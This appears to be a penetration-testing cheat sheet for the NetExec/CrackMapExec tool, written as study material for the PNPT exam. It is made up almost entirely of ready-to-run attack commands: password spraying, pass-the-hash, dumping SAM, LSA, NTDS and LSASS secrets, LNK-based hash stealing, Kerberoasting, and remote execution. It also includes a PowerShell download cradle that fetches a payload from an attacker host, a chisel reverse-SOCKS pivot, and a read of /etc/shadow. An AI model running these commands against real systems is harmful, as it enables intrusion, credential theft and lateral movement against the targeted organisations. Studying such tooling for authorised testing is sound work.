# CrackMapExec / NetExec

NetExec (`nxc`) is the successor to CrackMapExec (`cme`) — the Swiss-army knife for the PNPT internal exam. One tool sweeps a subnet, validates creds, sprays passwords, dumps hashes, and moves laterally across SMB, LDAP, WinRM, MSSQL, SSH, FTP, RDP, WMI, NFS, and VNC. All commands below use `nxc` syntax; `cme` accepts the same flags.

{% hint style="info" %}
The three colors tell the whole story: **green** = valid creds, **red** = invalid, **magenta** = valid creds that couldn't complete auth (disabled account, wrong logon hours, must-change password). A `(Pwn3d!)` after a green result means you have admin — that host is yours.
{% endhint %}

## Core usage & global options

```bash
# List protocols / protocol-specific options
nxc --help
nxc <PROTOCOL> --help

# Threading, timeout, jitter
nxc <PROTOCOL> <TARGET> -t <THREADS> --timeout <SECONDS> --jitter <INTERVAL>

# Logging (per-command) or set log_mode = True in ~/.nxc/nxc.conf
nxc <PROTOCOL> <TARGET> --log output.txt

# JSON export (buggy — needs a full path)
nxc <PROTOCOL> <TARGET> [options] --export $(pwd)/output.txt
sed -i "s/'/\"/g" output.txt && cat output.txt | jq
```

### Target formats

```bash
nxc <PROTOCOL> <TARGET>                # Single host / hostname
nxc <PROTOCOL> <IP1> <IP2> <IP3>       # Multiple IPs
nxc <PROTOCOL> <TARGET>/24             # CIDR
nxc <PROTOCOL> <IP_START>-<IP_END>     # Range
nxc <PROTOCOL> targets.txt             # File, one target per line
```

### Authentication (all protocols)

| Method | Command |
| --- | --- |
| Username / password | `nxc <PROTOCOL> <TARGET> -u <USER> -p '<PASS>'` |
| Pass-the-Hash | `nxc <PROTOCOL> <TARGET> -u <USER> -H '<NTHASH>'` |
| Kerberos (password → auto TGT) | `nxc <PROTOCOL> <TARGET> -u <USER> -p '<PASS>' -k` |
| Kerberos (ccache) | `export KRB5CCNAME=ticket.ccache; nxc <PROTOCOL> <TARGET> --use-kcache` |
| Certificate (PFX) | `nxc smb <TARGET> --pfx-cert user.pfx --pfx-pass <PASS> -u <USER>` |
| Local (non-domain) | `nxc <PROTOCOL> <TARGET> -u <USER> -p '<PASS>' --local-auth` |

```bash
# Credentials starting with a dash need the = form
nxc <PROTOCOL> <TARGET> -u='-username' -p='-password'

# Multi-domain file (DOMAIN\user per line)
nxc <PROTOCOL> <TARGET> -u users_with_domains.txt -p '<PASS>'
```

### Password spraying

{% hint style="danger" %}
Get the password policy **before** you spray, or you'll lock out accounts and blow the engagement. Check `--pass-pol`, watch `badpwdcount`, and use `--jitter` + fail limits. Lockouts are a fast way to fail the PNPT.
{% endhint %}

```bash
# Single password across a user list
nxc <PROTOCOL> <TARGET> -u users.txt -p '<PASS>' --continue-on-success

# One-to-one mapping (user1→pass1, ...)
nxc <PROTOCOL> <TARGET> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

# Username == password check
nxc <PROTOCOL> <TARGET> -u users.txt -p users.txt --no-bruteforce --continue-on-success

# Hash spraying
nxc <PROTOCOL> <TARGET> -u users.txt -H hashes.txt --no-bruteforce --continue-on-success

# Throttle + lockout protection
nxc <PROTOCOL> <TARGET> --jitter 2-5 -u users.txt -p passwords.txt
nxc <PROTOCOL> <TARGET> --gfail-limit <N> -u users.txt -p passwords.txt   # global
nxc <PROTOCOL> <TARGET> --ufail-limit <N> -u users.txt -p passwords.txt   # per-user
```

Magenta STATUS codes worth knowing: `STATUS_ACCOUNT_DISABLED`, `STATUS_ACCOUNT_EXPIRED`, `STATUS_PASSWORD_EXPIRED`, `STATUS_PASSWORD_MUST_CHANGE`, `STATUS_INVALID_LOGON_HOURS`, `STATUS_INVALID_WORKSTATION`. For `MUST_CHANGE`, reset it:

```bash
smbpasswd -r <DC_IP> -U <USER>       # enter old password, then new twice

# Track badpwdcount before spraying (resets on a correct auth)
nxc smb <TARGET> -u <USER> -p '<PASS>' --users
```

### Modules

```bash
nxc <PROTOCOL> -L                                    # List modules
nxc <PROTOCOL> -M <MODULE> --options                 # Module options
nxc <PROTOCOL> <TARGET> -u <USER> -p '<PASS>' -M <MODULE> -o KEY=value
nxc <PROTOCOL> <TARGET> -u <USER> -p '<PASS>' -M spooler -M webdav -M lsassy   # chain several
```

### Credential database (nxcdb)

```bash
nxcdb                                          # database shell
nxcdb (default) > workspace create <NAME>
nxcdb (default) > proto smb
nxcdb (default)(smb) > creds                   # stored credentials
nxcdb (default)(smb) > hosts                   # discovered hosts
nxcdb (default)(smb) > shares                  # discovered shares
nxcdb (default)(smb) > export creds csv /tmp/creds.csv
```

### BloodHound integration

```bash
# In ~/.nxc/nxc.conf set bh_enabled = True — successful auths auto-mark users owned
# Mark computers owned (users are automatic)
nxc smb <TARGET> -u <USER> -p '<PASS>' -M bh_owned -o PASS=<NEO4J_PASS>

# Collect BloodHound data over LDAP
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --bloodhound --collection All
```

### C2 handoff

```bash
# PowerShell Empire agent
nxc smb <TARGET> -u <USER> -p '<PASS>' -M empire_exec -o LISTENER=<NAME>

# Metasploit web_delivery URL
nxc smb <TARGET> -u <USER> -p '<PASS>' -M web_delivery -o URL=http://<ATTACKER_IP>:<PORT>/<PATH>

# Generic download cradle
nxc smb <TARGET> -u <USER> -p '<PASS>' -X "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/payload.ps1')" --no-output
```

## SMB protocol

### Discovery & info

```bash
nxc smb <TARGET>/24                                    # live hosts + signing
nxc smb <TARGET>/24 --gen-relay-list relay.txt         # hosts with signing off
nxc smb <TARGET>/24 -u <USER> -p '<PASS>' --generate-hosts-file
nxc smb <TARGET> -u <USER> -p '<PASS>' --generate-tgt ticket.ccache
```

### Authentication & null sessions

```bash
nxc smb <TARGET> -u <USER> -p '<PASS>'                 # domain
nxc smb <TARGET> -u <USER> -H '<NTHASH>'               # PtH
nxc smb <TARGET> -u <USER> -p '<PASS>' --local-auth    # local
nxc smb <TARGET> -u '' -p ''                           # null session
nxc smb <TARGET> -u 'guest' -p ''                      # guest fallback
nxc smb <TARGET> -u <LAPS_READER> -p '<PASS>' --laps   # LAPS password
```

### Enumeration

```bash
# Shares
nxc smb <TARGET> -u '' -p '' --shares                          # null session
nxc smb <TARGET> -u <USER> -p '<PASS>' --shares READ,WRITE     # filter by access

# Users, groups, RIDs
nxc smb <TARGET> -u <USER> -p '<PASS>' --users
nxc smb <TARGET> -u <USER> -p '<PASS>' --rid-brute             # brute RIDs (great on null)
nxc smb <TARGET> -u <USER> -p '<PASS>' --local-group

# Sessions / logged-on users (admin) — hunt where a DA is logged in
nxc smb <TARGET> -u <USER> -p '<PASS>' --loggedon-users
nxc smb <TARGET> -u <USER> -p '<PASS>' --qwinsta

# Policy + host info
nxc smb <TARGET> -u <USER> -p '<PASS>' --pass-pol              # password policy
nxc smb <TARGET> -u <USER> -p '<PASS>' --computers
nxc smb <TARGET> -u <USER> -p '<PASS>' -M enum_av              # AV/EDR (no admin)
```

### Vulnerability scanning

```bash
nxc smb <TARGET> -u '' -p '' -M zerologon
nxc smb <TARGET> -u '' -p '' -M printnightmare
nxc smb <TARGET> -u '' -p '' -M smbghost
nxc smb <TARGET> -u '' -p '' -M ms17-010
nxc smb <TARGET> -u <USER> -p '<PASS>' -M nopac
nxc smb <TARGET> -u <USER> -p '<PASS>' -M ntlm_reflection      # CVE-2025-33073

# Run several at once
nxc smb <TARGET> -u '' -p '' -M zerologon -M printnightmare -M smbghost -M ms17-010

# Coercion checks (see Relay & Coerce)
nxc smb <TARGET> -u '' -p '' -M coerce_plus -o LISTENER=<ATTACKER_IP>
```

### Command execution

{% hint style="warning" %}
With UAC on (default), only the built-in Administrator (RID 500) gets `Pwn3d!` for **local** admins — other local admins are filtered unless `LocalAccountTokenFilterPolicy = 1`. Domain accounts in the local Administrators group are **not** affected.
{% endhint %}

```bash
nxc smb <TARGET> -u <USER> -p '<PASS>' -x 'whoami'                 # cmd
nxc smb <TARGET> -u <USER> -p '<PASS>' -X '$PSVersionTable'        # PowerShell (auto AMSI bypass)

# Force an execution method (default failover: wmiexec → atexec → smbexec → mmcexec)
nxc smb <TARGET> -u <USER> -p '<PASS>' -x 'whoami' --exec-method smbexec

# Impersonate a logged-on user via scheduled task
nxc smb <TARGET> -u <ADMIN> -p '<PASS>' -M schtask_as -o USER=<TARGET_USER> CMD='whoami'
```

### File operations & spidering

```bash
nxc smb <TARGET> -u <USER> -p '<PASS>' --put-file /local/path \\remote\\path
nxc smb <TARGET> -u <USER> -p '<PASS>' --get-file \\remote\\path /local/path

# Spider shares for filenames or content
nxc smb <TARGET> -u <USER> -p '<PASS>' --spider <SHARE> --pattern <KEYWORD>
nxc smb <TARGET> -u <USER> -p '<PASS>' --spider <SHARE> --content --regex <TERM>

# JSON inventory of everything readable
nxc smb <TARGET> -u <USER> -p '<PASS>' -M spider_plus -o EXCLUDE_DIR=IPC$,print$,NETLOGON,SYSVOL
```

### Credential dumping (requires admin)

```bash
# Local secrets
nxc smb <TARGET> -u <USER> -p '<PASS>' --sam                   # SAM hashes
nxc smb <TARGET> -u <USER> -p '<PASS>' --lsa                   # LSA secrets, cached DCC2, service creds

# Domain hashes (DC only)
nxc smb <DC_IP> -u <USER> -p '<PASS>' --ntds                   # via drsuapi
nxc smb <DC_IP> -u <USER> -p '<PASS>' --ntds --user Administrator
nxc smb <DC_IP> -u <USER> -p '<PASS>' --ntds vss               # Volume Shadow Copy

# LSASS dumping
nxc smb <TARGET> -u <USER> -p '<PASS>' -M lsassy               # in-memory, stealthy
nxc smb <TARGET> -u <USER> -p '<PASS>' -M nanodump             # reuses existing handles

# DPAPI (Credential Manager, browser secrets, cookies)
nxc smb <TARGET> -u <USER> -p '<PASS>' --dpapi
nxc smb <TARGET> -u <USER> -p '<PASS>' --dpapi cookies
```

DCC2 cached creds (`$DCC2$`) crack with `hashcat -m 2100` and **cannot** be used for Pass-the-Hash.

### App credential modules

```bash
nxc smb <TARGET> -u <USER> -p '<PASS>' -M gpp_password         # GPP creds in SYSVOL
nxc smb <TARGET> -u <USER> -p '<PASS>' -M gpp_autologin
nxc smb <TARGET> -u <USER> -p '<PASS>' -M keepass_discover
nxc smb <TARGET> -u <USER> -p '<PASS>' -M veeam                # Veeam backup passwords
nxc smb <TARGET> -u <USER> -p '<PASS>' -M winscp -M putty -M mremoteng -M rdcman
nxc smb <TARGET> -u <USER> -p '<PASS>' -M wifi                 # saved WiFi keys
```

### Hash-stealing modules

```bash
# Slinky — drop LNK files with UNC icons on writable shares → NTLMv2 to your listener
nxc smb <TARGET> -u <USER> -p '<PASS>' -M slinky -o SERVER=<ATTACKER_IP> NAME=<LNK_NAME>
nxc smb <TARGET> -u <USER> -p '<PASS>' -M slinky -o NAME=<LNK_NAME> CLEANUP=YES

# drop-sc — .searchConnector-ms alternative
nxc smb <TARGET> -u <USER> -p '<PASS>' -M drop-sc -o URL=\\\\<ATTACKER_IP>\\<SHARE> SHARE=<TARGET_SHARE> FILENAME=<NAME>
# Catch with Responder / relay with ntlmrelayx — see Relay & Coerce
```

### Post-compromise account manipulation

```bash
# Change a password (own, or ForceChangePassword abuse)
nxc smb <TARGET> -u <USER> -p '<PASS>' -M change-password -o USER=<TARGET_USER> NEWPASS='<NEWPASS>'

# Modify group membership (needs AddMember/AddSelf right)
nxc smb <TARGET> -u <USER> -p '<PASS>' -M modify-group -o USER=<TARGET_USER> GROUP='<GROUP>'
```

## LDAP protocol

{% hint style="info" %}
LDAP queries need the DC's **FQDN**, not just the IP, or you'll hit "Error connecting to the domain." Add it to `/etc/hosts` or use `--generate-hosts-file` from an SMB sweep first.
{% endhint %}

```bash
# Auth + enumerate
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --users
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --groups "Domain Admins"
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --active-users
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --get-sid
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --admin-count

# Raw query
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --query "(adminCount=1)" "sAMAccountName"

# Password hunting in descriptions
nxc ldap <DC_IP> -u <USER> -p '<PASS>' -M get-desc-users -o FILTER=pass
```

### Kerberos attacks over LDAP

```bash
# ASREPRoast (no auth — needs a user list)
nxc ldap <DC_IP> -u users.txt -p '' --asreproast asrep.txt      # crack: hashcat -m 18200

# Kerberoasting
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --kerberoasting kerb.txt # crack: hashcat -m 13100

# Targeted Kerberoast (set a temp SPN, then remove)
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --kerberoasting kerb.txt --targeted-kerberoast <VICTIM>
```

### Delegation, trusts, ADCS

```bash
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --trusted-for-delegation   # unconstrained
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --find-delegation          # all misconfigs
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --dc-list                  # DCs + trusts
nxc ldap <DC_IP> -u <USER> -p '<PASS>' -M adcs                    # ADCS templates
nxc ldap <DC_IP> -u <USER> -p '<PASS>' -M ldap-checker            # LDAP signing status
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --gmsa                     # gMSA passwords (LDAPS)
nxc ldap <DC_IP> -u <USER> -p '<PASS>' -M daclread -o TARGET=<OBJECT> ACTION=read
```

## WinRM protocol

```bash
nxc winrm <TARGET> -u <USER> -p '<PASS>'                          # auth (look for Pwn3d!)
nxc winrm <TARGET> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
nxc winrm <TARGET> -u <USER> -p '<PASS>' -X 'whoami'              # PowerShell exec
nxc winrm <TARGET> -u <LAPS_READER> -p '<PASS>' --laps
nxc winrm <TARGET> -u <USER> -p '<PASS>' --sam                    # dump SAM
```

## MSSQL protocol

{% hint style="info" %}
Three account types authenticate to MSSQL: **AD** (`-d <DOMAIN>`), **local Windows** (`-d .`), and **SQL** (`--local-auth`). Password reuse between AD and SQL accounts is extremely common — always try it.
{% endhint %}

```bash
nxc mssql <TARGET> -u <USER> -p '<PASS>' -d <DOMAIN>              # AD account
nxc mssql <TARGET> -u <USER> -p '<PASS>' --local-auth            # SQL account
nxc mssql <TARGET> -u <USER> -p '<PASS>' -q 'SELECT name FROM master.dbo.sysdatabases;'
nxc mssql <TARGET> -u <USER> -p '<PASS>' -x 'whoami'             # xp_cmdshell RCE
nxc mssql <TARGET> -u <USER> -p '<PASS>' -M mssql_priv           # impersonate sa
nxc mssql <TARGET> -u <USER> -p '<PASS>' -M enum_links           # linked servers
nxc mssql <TARGET> -u <USER> -p '<PASS>' -M link_xpcmd -o LINKED_SERVER=<NAME> CMD='whoami'
```

## Other protocols

```bash
# SSH
nxc ssh <TARGET> -u <USER> --key-file <PRIVATE_KEY> -p ''
nxc ssh <TARGET> -u <USER> -p '<PASS>' -x 'whoami'

# FTP
nxc ftp <TARGET> -u <USER> -p '<PASS>' --ls
nxc ftp <TARGET> -u <USER> -p '<PASS>' --get <REMOTE_FILE>

# RDP — screenshot to find live sessions, or NLA-less login page for usernames
nxc rdp <TARGET> -u <USER> -p '<PASS>' --screenshot
nxc rdp <TARGET> --nla-screenshot

# WMI
nxc wmi <TARGET> -u <USER> -p '<PASS>' -x 'whoami'

# NFS — enumerate exports and abuse root_squash misconfig
nxc nfs <TARGET> --shares
nxc nfs <TARGET> --get-file /etc/shadow shadow.txt

# VNC — check for no-auth access
nxc vnc <TARGET>                                                 # shows (No Auth:True) if open
```

## Pivoting through a compromised host

```bash
# Chisel reverse SOCKS to reach an internal segment through a pivot
./chisel server --reverse                                        # attacker
nxc smb <PIVOT> -u <USER> -p '<PASS>' --put-file ./chisel.exe \\Windows\\Temp\\chisel.exe
nxc smb <PIVOT> -u <USER> -p '<PASS>' -x "C:\Windows\Temp\chisel.exe client <ATTACKER_IP>:8080 R:socks"
# Then: /etc/proxychains.conf → socks5 127.0.0.1 1080
proxychains4 -q nxc smb <INTERNAL_TARGET> -u <USER> -p '<PASS>' --shares
```

## Exam workflow

```bash
# 1. Host discovery + signing check (relay list for later)
nxc smb <TARGET>/24 --gen-relay-list relay.txt

# 2. Null / guest checks
nxc smb <TARGET> -u '' -p '' --shares --users --pass-pol
nxc smb <TARGET> -u 'guest' -p '' --shares

# 3. Vuln + coercion scan
nxc smb <TARGET> -u '' -p '' -M zerologon -M printnightmare -M ms17-010
nxc smb <TARGET> -u '' -p '' -M coerce_plus

# 4. Spray (ONLY after reading the password policy)
nxc smb <TARGET> -u users.txt -p '<PASS>' --continue-on-success

# 5. Enumerate + roast with valid creds
nxc smb <TARGET> -u <USER> -p '<PASS>' --shares --users
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --asreproast asrep.txt
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --kerberoasting kerb.txt
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --find-delegation

# 6. Dump creds with admin
nxc smb <TARGET> -u <ADMIN> -p '<PASS>' --sam --lsa -M lsassy
nxc smb <DC_IP> -u <ADMIN> -p '<PASS>' --ntds

# 7. Spray found creds/hashes for lateral movement
nxc smb <TARGET>/24 -u <USER> -H '<HASH>' --continue-on-success
```

## References

* NetExec: https://github.com/Pennyw0rth/NetExec
* NetExec Wiki: https://www.netexec.wiki/

## Related

* [Relay & Coerce](relay-and-coerce.md) — feed `--gen-relay-list` and `coerce_plus` into a relay
* [Mimikatz](mimikatz.md) — deeper credential extraction once you have a shell
* [AD Attacks](ad-attacks.md) · [Kerberos Attacks](kerberos-attacks.md) — roasting and delegation follow-through
* [Credential Dumping](credential-dumping.md) · [Password Hash Attacks](password-hash-attacks.md) · [Lateral Movement](lateral-movement.md) — the spray-dump-move loop
* [Report Writing](report-writing.md) — capturing `nxc` output as verbatim finding evidence
